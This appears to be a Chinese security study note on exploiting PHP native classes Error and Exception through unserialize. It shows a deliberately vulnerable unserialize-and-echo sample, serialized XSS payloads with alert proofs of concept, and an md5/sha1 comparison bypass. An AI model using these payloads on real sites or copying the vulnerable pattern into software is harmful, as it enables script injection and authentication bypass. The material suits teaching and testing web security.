[反序列化之PHP原生类的利用](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html)

>获取php原生类中的魔术方法

```php
<?php
$classes = get_declared_classes();
foreach ($classes as $class) {
    $methods = get_class_methods($class);
    foreach ($methods as $method) {
        if (in_array($method, array(
            '__construct',
            '__destruct',
            '__call',
            '__callStatic',
            '__get',
            '__set',
            '__isset',
            '__unset',
            '__sleep',
            '__wakeup',
            '__toString',
            '__invoke',
            '__set_state'
        ))) {
            echo $class . '::' . $method . "<br>";
        }
    }
}
```

>攻击样例文件

```php
<?php
$tmp = unserialize($_POST['str']);
echo $tmp;
```

# 使用Error/Exception进行XSS

1. Error

[https://www.php.net/manual/zh/class.error.php](https://www.php.net/manual/zh/class.error.php)

Error是所有PHP内部错误类的基类(仅适用与PHP 7,PHP 8)

```php
 class Error implements Throwable {
/* 属性 */
protected string $message;
protected int $code;
protected string $file;
protected int $line;
/* 方法 */
public __construct(string $message = "", int $code = 0, ?Throwable $previous = null)
final public getMessage(): string
final public getPrevious(): ?Throwable
final public getCode(): int
final public getFile(): string
final public getLine(): int
final public getTrace(): array
final public getTraceAsString(): string
public __toString(): string
final private __clone(): void
}
```

>注意到`__construct`中有`$message`和`$code`,但`__toString`中仅使用了`$message`


[Error::__toString](https://www.php.net/manual/zh/error.tostring.php)

`public Error::__toString(): string`返回Error的string表达形式

```php
<?php
try {
    throw new Error("Some error message");
} catch(Error $e) {
    echo $e;
}
?>
```

假设Error中的字符串可以被设置为`<script>alert('misaka')</script>`,那么在反序列化后就会产生XSS攻击

```php
<?php
$a = new Error("<script>alert('misaka')</script>");
var_dump($a);
$b = serialize($a);
var_dump($b);
var_dump(urlencode($b));
```

```php
object(Error)[1]
  protected 'message' => string '<script>alert('misaka')</script>' (length=32)
  private 'string' => string '' (length=0)
  protected 'code' => int 0
  protected 'file' => string '/var/www/html/declared_class_unserialize/Error_xss.php' (length=54)
  protected 'line' => int 2
  private 'trace' => 
    array (size=0)
      empty
  private 'previous' => null
string 'O:5:"Error":7:{s:10:"�*�message";s:32:"<script>alert('misaka')</script>";s:13:"�Error�string";s:0:"";s:7:"�*�code";i:0;s:7:"�*�file";s:54:"/var/www/html/declared_class_unserialize/Error_xss.php";s:7:"�*�line";i:2;s:12:"�Error�trace";a:0:{}s:15:"�Error�previous";N;}' (length=265)
string 'O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A32%3A%22%3Cscript%3Ealert%28%27misaka%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A54%3A%22%2Fvar%2Fwww%2Fhtml%2Fdeclared_class_unserialize%2FError_xss.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D' (length=463)
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202112031419433.png)

2. Exception

[https://www.php.net/manual/zh/class.exception.php](https://www.php.net/manual/zh/class.exception.php)

Exception是所有用户级异常的基类(PHP 5,PHP 7,PHP 8)

```php
 class Exception implements Throwable {
/* 属性 */
protected string $message;
protected int $code;
protected string $file;
protected int $line;
/* 方法 */
public __construct(string $message = "", int $code = 0, ?Throwable $previous = null)
final public getMessage(): string
final public getPrevious(): ?Throwable
final public getCode(): int
final public getFile(): string
final public getLine(): int
final public getTrace(): array
final public getTraceAsString(): string
public __toString(): string
final private __clone(): void
}
```

>注意到`__construct`中有`$message`和`$code`,但`__toString`中仅使用了`$message`

[Exception::__toString](https://www.php.net/manual/zh/exception.tostring.php)

`public Exception::__toString(): string`返回转换为字符串`string`类型的异常

```php
<?php
try {
    throw new Exception("Some error message");
} catch(Exception $e) {
    echo $e;
}
?>
```

假设Exception中的字符串可以被设置为`<script>alert('misaka')</script>`,那么在反序列化后就会产生XSS攻击

```php
<?php
$a = new Exception("<script>alert('misaka')</script>");
var_dump($a);
$b = serialize($a);
var_dump($b);
var_dump(urlencode($b));
```

```php
object(Exception)[1]
  protected 'message' => string '<script>alert('misaka')</script>' (length=32)
  private 'string' => string '' (length=0)
  protected 'code' => int 0
  protected 'file' => string '/var/www/html/declared_class_unserialize/Exception_xss.php' (length=58)
  protected 'line' => int 2
  private 'trace' => 
    array (size=0)
      empty
  private 'previous' => null
string 'O:9:"Exception":7:{s:10:"�*�message";s:32:"<script>alert('misaka')</script>";s:17:"�Exception�string";s:0:"";s:7:"�*�code";i:0;s:7:"�*�file";s:58:"/var/www/html/declared_class_unserialize/Exception_xss.php";s:7:"�*�line";i:2;s:16:"�Exception�trace";a:0:{}s:19:"�Exception�previous";N;}' (length=285)
string 'O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A32%3A%22%3Cscript%3Ealert%28%27misaka%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A58%3A%22%2Fvar%2Fwww%2Fhtml%2Fdeclared_class_unserialize%2FException_xss.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D' (length=483)
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202112031431095.png)

# 使用Error/Exception进行hash绕过

`Error`与`Exception`的`__construct`函数中均使用了`$message`和`$code`,但`__toString`中仅使用了`$message`,利用这一特性可以构造hash相同但值不同的两个变量

```php
<?php
$a = new Error($message = "misaka", $code = 0);$b = new Error($message = "misaka", $code = 1);
var_dump($a);
var_dump($b);
var_dump(md5($a));
var_dump(md5($b));
var_dump(sha1($a));
var_dump(sha1($b));
```

```php
object(Error)[1]
  protected 'message' => string 'misaka' (length=6)
  private 'string' => string '' (length=0)
  protected 'code' => int 0
  protected 'file' => string '/var/www/html/declared_class_unserialize/hash_cmp.php' (length=53)
  protected 'line' => int 2
  private 'trace' => 
    array (size=0)
      empty
  private 'previous' => null
object(Error)[2]
  protected 'message' => string 'misaka' (length=6)
  private 'string' => string '' (length=0)
  protected 'code' => int 1
  protected 'file' => string '/var/www/html/declared_class_unserialize/hash_cmp.php' (length=53)
  protected 'line' => int 2
  private 'trace' => 
    array (size=0)
      empty
  private 'previous' => null
string 'ef3dfed4019c082d5ee86e9e93e1e4b1' (length=32)
string 'ef3dfed4019c082d5ee86e9e93e1e4b1' (length=32)
string '131a711c4511f16665626f4f69dfe4b48339addf' (length=40)
string '131a711c4511f16665626f4f69dfe4b48339addf' (length=40)
```